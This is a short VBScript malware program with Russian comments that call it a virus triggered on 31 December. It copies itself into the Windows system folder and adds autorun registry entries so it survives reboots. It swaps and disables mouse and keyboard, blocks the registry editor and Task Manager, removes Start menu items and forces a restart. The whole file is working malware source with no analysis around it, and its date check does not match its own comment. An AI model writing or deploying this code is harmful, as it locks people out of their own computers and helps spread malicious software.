Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")

'     Запускать вирус каждое 31 число Декабря
If Day(Date)<>31 and Month(Date)<>12 Then WScript.quit

'     Поменять функции клавиш мышки местами
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SwapNT", "rundll32 user32, SwapMouseButton"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Swap98", "rundll32.exe user.exe, swapmousebutton"
Shell.Run "rundll32 user32, SwapMouseButton"

'     Вырубить клавиатуру(Только для Windows 95,98,Me)
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Dead", "rundll32 keyboard,disable"
Shell.Run "rundll32.exe keyboard.exe, disable"

'     Отключить мышь(Только для Windows 95,98,Me)
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Mad", "rundll32 mouse,disable"
Shell.Run "rundll32.exe mouse.exe, disable"

' Минимизировать все окна
Application.MinimizeAll

' Запускаться при каждой перезагрузке
Set File2 = FileSystemObject.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

' Блокировать RegEdit(чтоб у него не заводился редактор реестра).Для того чтобы разблокировать происвойте DisableRegistryTools значение - 0
Shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"

' Удаление пунктов меню Пуск: Программы, Завершение работы, Найти, Выполнить, Документы и т.д.
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoStartMenuMorePrograms", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoClose", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoFind", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoRun", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoRecentDocsMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoFavoritesMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoStartMenuLogoff", 1, "REG_DWORD"

Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoClose", 1, "REG_DWORD"

'     Перезагрузить компьютер(Только для Windows 95,98,Me)
Shell.Run "Rundll32.exe User.exe,ExitWindows"

